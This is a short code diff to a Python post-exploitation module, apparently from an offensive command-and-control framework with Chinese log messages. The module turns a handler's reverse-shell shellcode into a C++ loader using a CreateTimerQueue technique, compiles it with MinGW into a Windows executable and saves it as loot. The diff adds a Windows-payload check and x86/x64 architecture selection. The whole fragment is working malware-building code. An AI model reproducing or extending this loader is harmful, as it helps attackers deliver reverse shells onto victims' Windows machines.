@@ -28,14 +28,21 @@ class PostModule(PostPythonModule):
 
     def check(self):
         """执行前的检查函数"""
-
+        payload = self.get_handler_payload()
+        if "windows" not in payload:
+            return False, "模块只支持windows类型载荷"
         return True, None
 
     def run(self):
         shellcode = self.generate_hex_reverse_shellcode_by_handler()
         source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode)
         mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
-        binbytes = mingw.compile()
+        payload = self.get_handler_payload()
+        if "x64" not in payload:
+            arch = "x86"
+        else:
+            arch = "x64"
+        binbytes = mingw.compile(arch=arch)
         filename = f"CreateTimerQueue_{int(time.time())}.exe"
         self.write_to_loot(filename=filename, data=binbytes)
         self.log_good("模块执行成功")
